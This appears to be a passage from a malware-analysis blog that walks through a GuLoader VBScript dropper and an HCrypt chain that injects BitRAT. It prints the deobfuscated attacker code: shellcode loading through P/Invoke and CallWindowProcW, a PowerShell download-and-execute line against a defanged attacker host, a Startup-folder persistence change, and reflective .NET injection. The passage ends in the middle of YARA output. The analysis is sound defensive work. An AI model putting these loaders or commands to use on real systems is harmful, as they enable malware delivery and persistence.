confirm with file and xxd. Sure enough, it looks like we’re dealing with a text file, and the first few bytes of the text file looks like they might be a VBScript comment prepended with a &#39; character.remnux@remnux:~/cases/guloader$ file remittence.vbs remittence.vbs: ASCII text, with CRLF line terminatorsremnux@remnux:~/cases/guloader$ xxd remittence.vbs | head00000000: 2767 656e 6b61 6c64 656c 7320 556e 6d65 &#39;genkaldels Unme00000010: 7769 6e67 6239 204e 6575 726f 6e64 6536 wingb9 Neuronde600000020: 204b 726f 7033 2042 6172 6265 7269 206d Krop3 Barberi m00000030: 6973 7265 2066 7269 6d20 554e 4143 2048 isre frim UNAC H00000040: 594c 4550 4920 4d41 4c54 4e49 4e20 4752 YLEPI MALTNIN GR00000050: 4144 2048 4f4c 4f53 5920 4272 7569 6e73 AD HOLOSY Bruins00000060: 6875 2064 656d 756c 2049 4e47 4956 4545 hu demul INGIVEE00000070: 5520 504f 5354 4e41 5445 4e20 5649 4e44 U POSTNATEN VIND00000080: 454e 5355 4e44 204b 7572 6461 6974 3320 ENSUND Kurdait3 00000090: 5448 4f4d 534f 4e41 4e54 2053 7562 7275 THOMSONANT SubruLooking at the details from exiftool, the size of the file stands out. Weighing in at 80 KiB, the script likely contains some binary/EXE content embedded inside. 673 lines of code, it’s a pretty decently-sized script. So let’s dive in!remnux@remnux:~/cases/guloader$ exiftool remittence.vbs ExifTool Version Number : 12.30File Name : remittence.vbsDirectory : .File Size : 80 KiBFile Modification Date/Time : 2022:01:25 01:07:38-05:00File Access Date/Time : 2022:01:24 21:43:55-05:00File Inode Change Date/Time : 2022:01:24 20:11:16-05:00File Permissions : -rw-r--r--File Type : TXTFile Type Extension : txtMIME Type : text/plainMIME Encoding : us-asciiNewlines : Windows CRLFLine Count : 673Word Count : 3409Examining the VBScript CodeImmediately on the first few lines of the script we can see several lines of VBScript comments. Usually comments are for code documentation (heh, right?) but in this case the adversary decided to put in some garbage code. This sort of thing is usually intended to stump static detection rules, lower AV detection rates, and slow down malware analysis. After a quick glance at the comment lines, there’s nothing that really tells me that we need to keep them, so we can just ignore or delete them.&#39;genkaldels Unmewingb9 Neuronde6 Krop3 Barberi misre frim UNAC HYLEPI MALTNIN GRAD HOLOSY Bruinshu demul INGIVEEU POSTNATEN VINDENSUND Kurdait3 THOMSONANT Subrules BRUGSGA Usselhed Fakt Waughtsfo Udmugning NONPRO NONDEFER MUDDERGRFT bondsla Bros europapa &#39;Bebrejd Blevins DRABS EDDA Uberrt2 TILLIGGEND Nedisni1 Unrefulg Tsum AGRA Renderne &#39;Darvon FORLDREKN Vasalsta faaspointe Numselea9 Speedw TVANGL Ejert stymieds Writ6 liquefy Censedspe4 MEANDR BOWLINGEN bassetters yokoonop visuals Platingbyg5 SKARNB Bygningsfe Pulli Farve baasetm klejne &#39;INDTRDELSE HJEMM Fortjenst Nsvi sirdar FORMAL Progra2 airworth Axometrybl6 Stan6 OBLIGATI Ineffi Unsa Conven Bisulfate AKUPUNKT preadjust SIDE Pels2 antilethar manch ALDERLIN Nimmedvor Next up in the code we have a simple sleep timer right after some variables get defined. The script sleeps for 2000 milliseconds before moving on to the next stage.Dim sired, objExec, strLineDim MyFile,teststrF = timerWscript.Sleep 2000G = timer If G &amp;gt; F thenDown in the next section the adversary decides to set the sired and CCA variables multiple times in a row. No idea why they do it like this, maybe they also hit the save button in MS Office multiple times for safety. The sired variable contains a Wscript shell object and CCA contains a file system object for file writing.set sired = CreateObject(&quot;Wscript.Shell&quot;)Set CCA = CreateObject(&quot;S&quot;+&quot;cripting.FileSystemObject&quot;)set sired = CreateObject(&quot;Wscript.Shell&quot;)Set CCA = CreateObject(&quot;S&quot;+&quot;cripting.FileSystemObject&quot;)set sired = CreateObject(&quot;Wscript.Shell&quot;)Set CCA = CreateObject(&quot;S&quot;+&quot;cripting.FileSystemObject&quot;)And now we get into the good meat of the script. The Fotografe6 variable is built over multiple lines and contains what loks like a hex string. I don’t see a traditional MZ header represented as 4D5A in hex, but it could be further obfuscated somehow. We’ll just have to watch and see how the script uses it.Fotografe6 = Fotografe6 &amp;amp; &quot;81ED000300006 ... EF9F10408E&quot;Fotografe6 = Fotografe6 &amp;amp; &quot;4166620BE8491 ... 62D3219DF4&quot;The clabbering variable, just like the previous one, is built over multiple lines. In this case it appears to be base64 code because once we feed some of the chunks into CyberChef with the “From Base64” it decodes into valid text.clabbering = clabbering &amp;amp; &quot;IwBBAEkAUgBFA ... AGEAbgB0AG&quot;clabbering = clabbering &amp;amp; &quot;kAdAB5AHIAbwAg ... bABrAG8AI&quot;clabbering = clabbering &amp;amp; &quot;ABuAG8AbgBtAGE ... AbwBpAHMA&quot;clabbering = clabbering &amp;amp; &quot;IABVAG4AdgBlAG ... MASABVAFQ&quot;Now that we have an idea of the materials being manipulated in the script, let’s see how the script uses them. The next chunk of code looks like it’s building a PowerShell command. At this point I’m thinking the base64 chunk of text in clabbering above will likely be fed into PowerShell for execution. Fotografe6 looks like it gets fed into a baggrun() and lugsai() function. Since shellPath contains a file path and the string ISO-8859-1 refers to encoding, my hypothesis is that lugsai() writes the contents of Fotografe6 to disk. Let’s go confirm that.TMP1 = &quot;%&quot;+&quot;TEMP%&quot;MyFile = sired.ExpandEnvironmentStrings(&quot;%windir%&quot;) &amp;amp; &quot;\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe&quot;Fotografe6 = baggrun(Fotografe6)shellPath = sired.ExpandEnvironmentStrings(TMP1) &amp;amp; &quot;\\Champag6.dat&quot;lugsai shellPath,Fotografe6,&quot;ISO-8859-1&quot;The lugsai() function looks like it works with an ADODB.Stream object, picks a character set, opens a file, and writes text to disk. So far it looks like our hypothesis was correct.Function lugsai(NONN, UNDEGRAD, Lathesme1) Dim BinaryStream ADO = &quot;ADODB.Stream&quot; Set BinaryStream = CreateObject(ADO) BinaryStream.Type = 2 BinaryStream.CharSet = Lathesme1 BinaryStream.Open BinaryStream.WriteText UNDEGRAD BinaryStream.SaveToFile NONN, 2End FunctionThe baggrun() function looks like it works with the hex string in Fotografe6. The function walks through the hex string and checks for “ZZZ” values. If it doesn’t find them it just outputs the hex string.Function baggrun(h) For i = 1 To len(h) step 2 if ChrW(&quot;&amp;amp;H&quot; &amp;amp; mid(h,i,2)) = &quot;ZZZ&quot; then Wscript.Sleep(1) baggrun = baggrun + ChrW(&quot;&amp;amp;H&quot; &amp;amp; mid(h,i,2)) NextEnd FunctionAnd now the script starts making some movement outside of itself. The -EncodedCommand string here indicates we’re likely going to see a PowerShell command with a base64 chunk of code. Sure enough, the base64 code in clabbering eventually gets used for the PowerShell command. So let’sSet obj1 = CreateObject(&quot;Shell.Application&quot;)max1=clabberingRAVNEAGT = &quot; -EncodedCommand &quot; &amp;amp; chr(34) &amp;amp; max1 &amp;amp; chr(34)If CCA.FileExists(MyFile) = True then obj1.ShellExecute MyFile , RAVNEAGT ,&quot;&quot;,&quot;&quot;,0else obj1.ShellExecute &quot;powershell.exe&quot;, RAVNEAGT ,&quot;&quot;,&quot;&quot;,0end if PowerShell Executing Shellcode with .NETAfter decoding the base64 in clabbering with CyberChef we can see some PowerShell code that gets executed. Just like the VBScript, the first line or two just contains a useless comment. Looking through the rest of the code there are also a few comments mingled among the useful stuff. For a bit more brevity I’ve gone ahead and removed comments from the code I show here. To slow down analysis some more, the adversary also threw in a bunch of Test-Path commands. None of them seemed to serve any function, so I removed them from the code here.The first big chunk of PowerShell is an Add-Type cmdlet followed by some C# code. Add-Type allows you to import a .NET class DLL into memory to work with in PowerShell. When combined with the -TypeDefinition, you can provide some raw C# code that gets compiled into bytecode at runtime and loaded into PowerShell. In this case, the adversary defines a .NET class named Ofayve1 that contains Platform Invoke (P/Invoke) code that allows the adversary to call native Win32 functions from .NET code.Add-Type -TypeDefinition @&quot;using System;using System.Runtime.InteropServices;public static class Ofayve1{[DllImport(&quot;ntdll.dll&quot;)]public static extern int NtAllocateVirtualMemory(int Ofayve6,ref Int32 Swat9,int Rasko8,ref Int32 Ofayve,int Metzerespe9,int Ofayve7);[DllImport(&quot;kernel32.dll&quot;)]public static extern IntPtr CreateFileA(string BUTTERMA,uint Contra6,int undvrpieti,int Ofayve0,int Foldysy7,int Oboer8,int BLUFF);[DllImport(&quot;kernel32.dll&quot;)]public static extern int ReadFile(int Rasko80,uint Rasko81,IntPtr Rasko82,ref Int32 Rasko83,int Rasko84);[DllImport(&quot;user32.dll&quot;)]public static extern IntPtr CallWindowProcW(IntPtr Rasko85,int Rasko86,int Rasko87,int Rasko88,int Rasko89);}&quot;@From here in, the adversary references that class/type to call Windows API functions. The first three are pretty self-explanatory and I’ll put links to their documentation here: NtAllocateVirtualMemory CreateFileA ReadFileWhen combined together, these functions read the contents of Champag6.dat and mapped them into memory at $Ofayve3. These contents included the hex string seen earlier, and my working hypothesis is that the file is some form of shellcode.$Ofayve3=0;$Ofayve9=1048576;$Ofayve8=[Ofayve1]::NtAllocateVirtualMemory(-1,[ref]$Ofayve3,0,[ref]$Ofayve9,12288,64)$Ofayve2=&quot;$env:temp&quot; + &quot;\\Champag6.dat&quot;$Ofayve4=[Ofayve1]::CreateFileA($Ofayve2,2147483648,1,0,3,128,0)$Ofayve5=0;[Ofayve1]::ReadFile($Ofayve4,$Ofayve3,26042,[ref]$Ofayve5,0)[Ofayve1]::CallWindowProcW($Ofayve3, 0,0,0,0)The final part of the script calls CallWindowProcW, which was unusual for me to see. I decided to get a little wild and do a Google search for “CallWindowProc shellcode” and ended up running across an interesting article on using function callbacks to run shellcode. Reading down the article, I could see some code that looks very similar to our sample:CallWindowProc((WNDPROC)(char *)shellcode, (HWND)0, 0, 0, 0);Sure enough, the GuLoader code above seems to match that callback article.But is it GuLoader?Honestly this is hard for me to tell. I largely trust the GuLoader tag in MalwareBazaar but it’s always good to have extra proof. When I open up the suspected shellcode in Ghidra there is some definite XOR activity going on.And when I use this little chunk of Python code, I can reverse that XOR:def str_xor(data, key): for i in range(len(data)): data[i] ^= key[i % len(key)] return datakey = bytearray(b&#39;0x6a8a4f58&#39;)data = bytearray(open(&#39;encoded_shellcode.bin&#39;, &#39;rb&#39;).read())decoded = str_xor(data, key)open(&quot;decoded_shellcode.bin&quot;, &quot;wb&quot;).write(decoded)Credit to https://reverseengineering.stackexchange.com/questions/11033/how-to-decrypt-data-in-binary-file-by-xor-operator-using-a-given-key-at-specificThe resulting shellcode gets some hits from capa as containing anti-VM and sandbox evasion measures.remnux@remnux:~/cases/guloader$ capa -f sc32 dec_shellcode.bin +------------------------------------------------------+------------------------------------+| md5 | 565eb36ab19132a4b963cc840febd24c || sha1 | 78dd372f6ed9962d0a0e3841675ab374235d2f94 || sha256 | 82ec24bbf698d635f3e7bfbda89971518f010c8efde79fcd43a2805a0945850f || path | dec_shellcode.bin |+------------------------------------------------------+------------------------------------++------------------------------------------------------+------------------------------------+| ATT&amp;amp;CK Tactic | ATT&amp;amp;CK Technique |+------------------------------------------------------+------------------------------------+| DEFENSE EVASION | Virtualization/Sandbox Evasion::System Checks T1497.001 |+------------------------------------------------------+------------------------------------++------------------------------------------------------+------------------------------------+| MBC Objective | MBC Behavior |+------------------------------------------------------+------------------------------------+| ANTI-BEHAVIORAL ANALYSIS | Virtual Machine Detection::Instruction Testing [B0009.029] |+------------------------------------------------------+------------------------------------++------------------------------------------------------+------------------------------------+| CAPABILITY | NAMESPACE |+------------------------------------------------------+------------------------------------+| execute anti-VM instructions | anti-analysis/anti-vm/vm-detection |+------------------------------------------------------+------------------------------------+This is where I stopped my particular analysis. GuLoader is rather famous for anti-VM, anti-sandbox, anti-whatever, so I feel pretty satisfied with our progress so far. Given the shellcode capabilities and the face that GuLoader usually involves shellcode like this, I’m good with calling it GuLoader.Thanks for reading!" }, { "title": "HCrypt Injecting BitRAT using PowerShell, HTAs, and .NET", "url": "/hcrypt-injecting-bitrat-analysis/", "categories": "malware", "tags": "malware, hcrypt, process-injection, powershell, hta, bitrat", "date": "2022-01-23 00:00:00 +0000", "snippet": "One of my colleagues made a statement recently about how commonplace process injection has become among malware, to the point where it seems adversaries don’t have to think about the injection techniques anymore. This is absolutely true as many adversaries deploying malware have begun using crypters like HCrypt or Snip3 that inject their arbitrary payloads into other arbitrary processes. In this post I’m going to walk though analyzing a malware payload protected using HCrypt and injected into aspnet_compiler.exe. If you want to play along at home, the sample is available in MalwareBazaar here: https://bazaar.abuse.ch/sample/f30cba9be2a7cf581939e7e7b958d5e0554265a685b3473947bf2c26679995d3/Wait, Isn’t Injection Complicated??Eh, process injection can be extremely technical and complicated depending on how deeply you want to understand process internals. If you’re simply looking to use process injection, there are multiple free and paid tools that will help you inject an arbitrary array of bytes into an arbitrary process’s memory. In some of the paid products, all an adversary needs to do is check a box. In the case of free tools, sometimes a little bit of coding is needed.Triaging PS1.hta and Decoding (Stage 01)MalwareBazaar says the sample is a HTA file, but we should still approach with caution using file.remnux@remnux:~/cases/bitrat$ file PS1.hta PS1.hta: HTML document, ASCII text, with very long lines, with no line terminatorsremnux@remnux:~/cases/bitrat$ xxd PS1.hta | head00000000: 3c73 6372 6970 7420 6c61 6e67 7561 6765 &amp;lt;script language00000010: 3d6a 6176 6173 6372 6970 743e 646f 6375 =javascript&amp;gt;docu00000020: 6d65 6e74 2e77 7269 7465 2875 6e65 7363 ment.write(unesc00000030: 6170 6528 2725 3343 7363 7269 7074 2532 ape(&#39;%3Cscript%200000040: 306c 616e 6775 6167 6525 3344 2532 3256 0language%3D%22V00000050: 4253 6372 6970 7425 3232 2533 4525 3041 BScript%22%3E%0A00000060: 4675 6e63 7469 6f6e 2532 3076 6172 5f66 Function%20var_f00000070: 756e 6325 3238 2532 3925 3041 4842 2532 unc%28%29%0AHB%200000080: 3025 3344 2532 3072 6570 6c61 6365 2532 0%3D%20replace%200000090: 3825 3232 706f 7725 3238 2d5f 2d25 3239 8%22pow%28-_-%29Alright, it looks like we have a HTA file! The file magic corresponded with HTML document thanks to the script tags on the inside. We can even sample the contents with xxd | head to see the strings correspond to script tags containing JavaScript. The JavaScript inside contains document.write() and unescape() function calls. This means the actual contents of the HTA file are a bit obfuscated using URL encoding and will be deobfuscated and written into an HTML document in memory at the time of rendering. To get further we need to deobfuscate the code ourselves safely.&amp;lt;script language=javascript&amp;gt;document.write(unescape(&#39;%3Cscript%20language%3D%22VBScript%22%3E%0AFunction%20...self.close%0A%3C/script%3E&#39;))&amp;lt;/script&amp;gt;Thankfully we can use a little bit of NodeJS to deobfuscate the code ourselves! Using the little bit of code below, we can write the deobfuscated HTA content into stage02.hta. If you want to see this approach used more, consider making a stop by this post where I decode a web shell using the same method.fs = require(&#39;fs&#39;)page = unescape(&#39;%3Cscript%20language%3D%22VBScript%22%3E%0AFunction%20...self.close%0A%3C/script%3E&#39;)fs.writeFileSync(&#39;stage02.hta&#39;,page)Decoding PowerShell From Stage 02Now let’s dive into stage02.hta! The HTA contains VBScript code within the HTA script tags. There’s quite a bit of string obfuscation going on here as well. First, we can tell from looking at the HB variable we’re likely looking into a PowerShell command, and the URL in HBB already shows that the sample downloads additional content. The easy hypothesis here is that PowerShell will likely download content from this URL and execute it. To confirm/disprove the hypothesis we need to remove the string obfuscation. Part of the deobfuscation is really easy using find/replace functionality in a code editor of your choice. The last bit of obfuscation requires a bit more work with your eyes. The {2}{0}{1} -f chunks of PowerShell code correspond with PowerShell Format strings. This feature lets the developer have variable “holding spots” in the middle of a string and specify the contents of the variable after the rest of the string is defined. To deobfuscate this part, just treat the strings after -f like an array, and join them together in the proper order.&amp;lt;script language=&quot;VBScript&quot;&amp;gt;Function var_func()HB = replace(&quot;pow(-_-)rsh(-_-)ll &quot;,&quot;(-_-)&quot;,&quot;e&quot;)HBB = &quot;$@@@x = &#39;hxxp://135.148.74[.]241/PS1_B.txt&#39;;$@@@$$$=(&#39;{2}{0}{1}&#39; -f&#39;---------l---------888---------Nguyễn Văn Tí---------d---------&#39;Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777(&#39;---------&#39;,&#39;&#39;),&#39;**********+++**********t**********r**********i**********n**********g**********&#39;Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777(&#39;**********&#39;,&#39;&#39;),&#39;++++++++++D++++++++++888++++++++++w++++++++++n++++++++++&#39;Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777(&#39;++++++++++&#39;,&#39;&#39;));$@@@$$$$$$=(&#39;{2}{0}{1}&#39; -f&#39;---------777---------$$$---------666---------l---------&#39;Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777(&#39;---------&#39;,&#39;&#39;),&#39;---------i---------777---------n---------t---------&#39;Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777(&#39;---------&#39;,&#39;&#39;),&#39;---------N777---------t---------Nguyễn Văn TủnW---------&#39;Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777(&#39;---------&#39;,&#39;&#39;));$@@@$$$$$$$$$=(&#39;{2}{0}{1}&#39; -f&#39;------w-888------$$$------j------777------666------t $------@@@------&#39;Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777(&#39;------&#39;,&#39;&#39;),&#39;------$$$$$$------)Nguyễn Văn Tủn$@@@------$$$(------$@@@------x)------&#39;Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777(&#39;------&#39;,&#39;&#39;),&#39;------I------`777------`X(------N777------&#39;Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777(&#39;------&#39;,&#39;&#39;));$@@@$$$$$$$$$$$$$$$ = ($@@@$$$$$$$$$ -J888in &#39;&#39;)|InV888k777-777xNguyễn Văn Tèor777++++++i888N&quot;HBB = replace(HBB,&quot;777&quot;,&quot;e&quot;)HBB = replace(HBB,&quot;888&quot;,&quot;o&quot;)HBB = replace(HBB,&quot;666&quot;,&quot;c&quot;)HBB = replace(HBB,&quot;+++&quot;,&quot;s&quot;)HBB = replace(HBB,&quot;$$$&quot;,&quot;B&quot;)HBB = replace(HBB,&quot;@@@&quot;,&quot;H&quot;)HBB = replace(HBB,&quot;Nguyễn Văn Tèo&quot;,&quot;P&quot;)HBB = replace(HBB,&quot;Nguyễn Văn Tí&quot;,&quot;a&quot;)HBB = replace(HBB,&quot;Nguyễn Văn Tủn&quot;,&quot;.&quot;)set HBBB = GetObject(replace(&quot;new:F935DC22-1CF(-_-)-11D(-_-)-ADB9-(-_-)(-_-)C(-_-)4FD58A(-_-)B&quot;,&quot;(-_-)&quot;,&quot;0&quot;))Execute(&quot;HBBB.Run HB+HBB, 0, True&quot;)End Functionvar_funcself.close&amp;lt;/script&amp;gt;After distilling the PowerShell command it looks like our hypothesis is confirmed! The PowerShell command creates a Net.WebClient object and calls DownloadString() to retrieve additional content. Then the content is fed into Invoke-Expression. Since this cmdlet is designed to execute additional arbitrary PowerShell commands, we can assume whatever gets downloaded is also PowerShell. So let’s dig into PS1_B.txt!$Hx = &#39;hxxp://135.148.74[.]241/PS1_B.txt&#39;;$HB=(&#39;DownloadString&#39;);$HBB=(&#39;Net.WebClient&#39;);$HBBB=(&#39;IeX(New-Object $HBB).$HB($Hx)&#39;);$HBBBBB =($HBBB -Join &#39;&#39;)|InVoke-exPressioNDecoding PS1_B.txt PowerShell (Stage 03)Fast-forwarding through the triage of this file, we can see it contains PowerShell code as expected. We can already see some low-hanging indicators in the content. C:\\ProgramData\\3814364655181379114711\\3814364655181379114711.HTA is going to contain the code specified in $FFF. Just like the first HTA file, the content is obfuscated using URL encoding. I’m going to wager that’s part of a persistence mechanism. Again, we see a URL and Invoke-Expression. It’s probably a safe bet that the URL delivers more PowerShell code. There’s also a hex-encoded string that likely contains PowerShell code. After getting decoded into $asciiString the code gets executed with iex, an alias for Invoke-Expression. So let’s get that cleartext string.$HHxHH = &quot;C:\\ProgramData\\3814364655181379114711&quot;$HHHxHHH = &quot;C:\\ProgramData\\3814364655181379114711&quot;$hexString = &quot;5b 73 79 73 74 65 6d 2e 69 6f 2e 64 69 72 65 63 74 6f 72 79 5d 3a 3a 43 72 65 61 74 65 44 69 72 65 63 74 6f 72 79 28 24 48 48 78 48 48 29 0a 73 74 61 72 74 2d 73 6c 65 65 70 20 2d 73 20 35 0a 53 65 74 2d 49 74 65 6d 50 72 6f 70 65 72 74 79 20 2d 50 61 74 68 20 22 48 4b 43 55 3a 5c 53 6f 66 74 77 61 72 65 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 43 75 72 72 65 6e 74 56 65 72 73 69 6f 6e 5c 45 78 70 6c 6f 72 65 72 5c 55 73 65 72 20 53 68 65 6c 6c 20 46 6f 6c 64 65 72 73 22 20 2d 4e 61 6d 65 20 22 53 74 61 72 74 75 70 22 20 2d 56 61 6c 75 65 20 24 48 48 48 78 48 48 48 3b&quot;$asciiChars = $hexString -split &#39; &#39; |ForEach-Object {[char][byte]&quot;0x$_&quot;}$asciiString = $asciiChars -join &#39;&#39;iex $asciiStringstart-sleep -s 3$FFF = @&#39;&amp;lt;script language=javascript&amp;gt;document.write(unescape(&#39;%3Cscript%20language%3D%22VBScript%22%3E%0AFunction%20var_func%28%29%0AHB%20%3D%20replace%28%22pow%28-_-%29rsh%28-_-%29ll%20%22%2C%22%28-_-%29%22%2C%22e%22%29%0AHBB%20%3D%20%22%24@@@x%20%3D%20%27hxxp://135.148.74[.]241/S_B.txt%27%3B%24@@@...self.close%0A%3C/script%3E&#39;))&amp;lt;/script&amp;gt;&#39;@Set-Content -Path C:\\ProgramData\\3814364655181379114711\\3814364655181379114711.HTA -Value $FFFstart-sleep -s 3$Hx = &#39;hxxp://135.148.74[.]241/S_B.txt&#39;;$HB=(&#39;{2}{0}{1}&#39; -f&#39;---------l---------o---------a---------d---------&#39;...&#39;&#39;)|InVokE-ExpresSioNAfter decoding using a PowerShell console, we have the cleartext below. Sure enough, the sample contains code to create a persistence mechanism in a Windows Registry key. The value of that key leads to the HTA dropped on disk.[system.io.directory]::CreateDirectory($HHxHH)start-sleep -s 5Set-ItemProperty -Path &quot;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders&quot; -Name &quot;Startup&quot; -Value $HHHxHHH;Now that we know what this stage does, let’s move forward to look into S_B.txt!Decoding S_B.txt PowerShell (Stage 04/Last Stop)In this stage we can immediately see two really large hex-encoded strings that I truncated here to keep the post manageable. The variables $HH1 and $H4 contain two hex strings that likely decode to Windows EXE files. We can immediately tell this because the strings start with 4D5A, which translates from hex into the traditional MZ magic bytes for Windows EXE files. Further down, the adversary has a VIP() function that decodes text from base64 strings. Finally, there’s some base64 code at the bottom of the script that has some string obfuscation inside that gets replaced/removed during runtime. If we do the replacement ourselves using find/replace we can have some legible base64 text to decode.$HH1 = &#39;4D5A9::::3 ... ::::::::::::::::::::::&#39;.Replace(&quot;:&quot;,&quot;0&quot;)[String]$H4=&#39;4D5A9::::3 ... :::::&#39;.Replace(&quot;:&quot;,&quot;0&quot;)FUNCTION VIP($9467422421889788552276){ $8398517835117813353988 = &quot;Get1859655144789612381153ng&quot;.Replace(&quot;1859655144789612381153&quot;,&quot;Stri&quot;); $4699715146936475627384 = [Text.Encoding];$7899832798818496373215 = &quot;U76241165786257964469388&quot;.Replace(&quot;7624116578625796446938&quot;,&quot;tf&quot;) $5654519196338572648864 = &quot;Fr&quot;+&quot;omBa&quot;+&quot;se6&quot;+&quot;4Str&quot;+&quot;ing&quot; $1436688125918197238672 = $4699715146936475627384::$7899832798818496373215.$8398517835117813353988([Convert]::$5654519196338572648864($9467422421889788552276)) return $1436688125918197238672}$AAAAASXXX = &#39;5961151185971873545969W15961151185971 ... 185971873545969nKXx5961151185971873545969JYEV5961151185971873545969gWA5961151185971873545969=5961151185971873545969=5961151185971873545969&#39;.Replace(&quot;5961151185971873545969&quot;,&quot;&quot;)$AAAAASXXXX = VIP($AAAAASXXX);IEX $AAAAASXXXXAnd after decoding the text ourselves, we have the chunk of code below! This chunk of code takes the hex-encoded strings and converts them into byte arrays. This is significant for a couple reasons in malware analysis. First, if the adversary simply wanted to execute the malware, they could run Start-Process or call the EXE manually. Holding the binaries as byte arrays means they’re planning to use them programmatically in PowerShell or .NET code, usually with some form of injection or reflective loading. Sure enough, at the end of the script contents we can see [Reflection.Assembly]::Load(). This call loads the contents of the $H5 binary into memory for use. These contents are likely a .NET DLL. The rest of the code calls the function HHH() from the class HH.HH in that loaded DLL, providing the input string containing aspnet_compiler.exe and the byte array $H6 which likely contains a payload the adversary intends to inject into aspnet_compiler.exe. I’ll cover this a bit more at the end of the post, but this style of payload delivery is incredibly common among modern crypters that adversaries use to shield their payloads. For the threat intel geeks, take note of the string $HBAR in the PowerShell code. This is one indicator we’re looking at HCrypt.[String]$H1= $HH1Function H2 { [CmdletBinding()] [OutputType([byte[]])] param( [Parameter(Mandatory=$true)] [String]$HBAR ) $H3 = New-Object -TypeName byte[] -ArgumentList ($HBAR.Length / 2) for ($i = 0; $i -lt $HBAR.Length; $i += 2) { $H3[$i / 2] = [Convert]::ToByte($HBAR.Substring($i, 2), 16) } return [byte[]]$H3}[Byte[]]$H5=H2 $H4[Byte[]]$H6= H2 $H1$H12 = &#39;C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30\\aspnet_compiler.exe&#39;[Reflection.Assembly]::Load($H5).GetType(&#39;HH.HH&#39;).GetMethod(&#39;HHH&#39;).Invoke($null,[object[]](,$H6))Now let’s get at those binaries!Extracting the BinariesNot going to lie, I cut some corners here using CyberChef. I used the Find/Replace operation followed by From Hex. Then we can save the contents out to disk and examine them.Decompiling the InjectorAlright, the first binary that I extracted was the .NET injection DLL held in $H5. The .NET code easily compiled with ilspycmd, but it contained a load of obfuscation. To save some time and space, I’ve gone ahead and included just the relevant parts below. The code contains references to kernel32, LoadLibraryA, and GetProcAddress. These references mean the code likely imports additional native, non-.NET DLL functions at runtime for its injection operations. We can also see the function HHH(), which would be a good breakpoint if we decided to get into debugging this .NET code. For the cyber threat intelligence geeks out there, there’s a feature in this code to help you pivot and find more samples in VirusTotal! The GUID 8c863524-938b-4d92-a507-f7032311c0d0 can be used with VirusTotal Intelligence or Enterprise to find additional samples using the search netguid:8c863524-938b-4d92-a507-f7032311c0d0. To learn more about the GUID, take a look at this post in VirusBulletin: https://www.virusbulletin.com/virusbulletin/2015/06/using-net-guids-help-hunt-malware/[assembly: AssemblyTitle(&quot;Bit&quot;)][assembly: AssemblyDescription(&quot;&quot;)][assembly: AssemblyConfiguration(&quot;&quot;)][assembly: AssemblyCompany(&quot;&quot;)][assembly: AssemblyProduct(&quot;Bit&quot;)][assembly: AssemblyCopyright(&quot;Copyright © 2021&quot;)][assembly: AssemblyTrademark(&quot;&quot;)][assembly: ComVisible(false)][assembly: Guid(&quot;8c863524-938b-4d92-a507-f7032311c0d0&quot;)][assembly: AssemblyFileVersion(&quot;1.0.0.0&quot;)][assembly: TargetFramework(&quot;.NETFramework,Version=v4.0&quot;, FrameworkDisplayName = &quot;.NET Framework 4&quot;)][assembly: AssemblyVersion(&quot;1.0.0.0&quot;)]namespace HH{ public static class HH { ... [DllImport(&quot;kernel32&quot;, EntryPoint = &quot;LoadLibraryA&quot;, SetLastError = true)] private static extern IntPtr a([MarshalAs(UnmanagedType.VBByRefStr)] ref string a); [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi, EntryPoint = &quot;GetProcAddress&quot;, ExactSpelling = true, SetLastError = true)] private static extern IntPtr b(IntPtr a, [MarshalAs(UnmanagedType.VBByRefStr)] ref string b); ... public static bool HHH(string HHHHHHHHHHBBBBBBBBBB, byte[] HHHHHHHHHHHHHHHHHHHHHHHHHHBBBBBBBBBBBBBBBBBBBBBBBBBBBB) { int num = 1; while (!d(HHHHHHHHHHBBBBBBBBBB, HHHHHHHHHHHHHHHHHHHHHHHHHHBBBBBBBBBBBBBBBBBBBBBBBBBBBB)) { num = checked(num + 1); if (num &amp;gt; 5) { return false; } } return true; }For now, that’s as much as I want to squeeze from the injector. Assuming it does its job of just injecting code, the interesting stuff will be in the second binary extracted.Identifying BitRATOnce we extract the second binary and name it payload.bin, we can use file to triage it. The output says the binary was packed with UPX, and we can unpack the binary using UPX in REMnux! Using upx -d, we can obtain the original payload. From here we can search VirusTotal for the hashes and import hash, finding that VirusTotal has already seen the file and identifies it as malicious.remnux@remnux:~/cases/bitrat$ file payload.bin payload.bin: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressedremnux@remnux:~/cases/bitrat$ upx -d payload.bin Ultimate Packer for eXecutables Copyright (C) 1996 - 2020UPX 3.96 Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 3943424 &amp;lt;- 1511424 38.33% win32/pe payload.binUnpacked 1 file.remnux@remnux:~/cases/bitrat$ file payload.bin payload.bin: PE32 executable (GUI) Intel 80386, for MS Windowsremnux@remnux:~/cases/bitrat$ pehash payload.bin file filepath: payload.bin md5: e47b1f77a31d1d91625997da66bb1a94 sha1: e29f96b7032e2e8447cd5ae6f8aaf0ac85db8cb9 sha256: 183809b333c8afcea627e845f08f56131ca63fe592498685d93d305207e6c07c ssdeep: 98304:X77Pmq33rE/JDLPWZADUGer7B6iY74M/rmlwXVZ:f+R/eZADUXR imphash: 71955ccbbcbb24efa9f89785e7cce225To get some better attribution on the malware family, we can borrow YARA rules from the ditekshen on GitHub. Using the rules at https://github.com/ditekshen/detection/blob/master/yara/malware.yar we can run a YARA scan and identify BitRAT.remnux@remnux:~/cases/bitrat$ yara -s malware.yar payload.bin MALWARE_Win_BitRAT payload.bin0x33abf0:$s1: \\plg\\0x33ad70:$s3: files_delete0x3399bc:$s9: 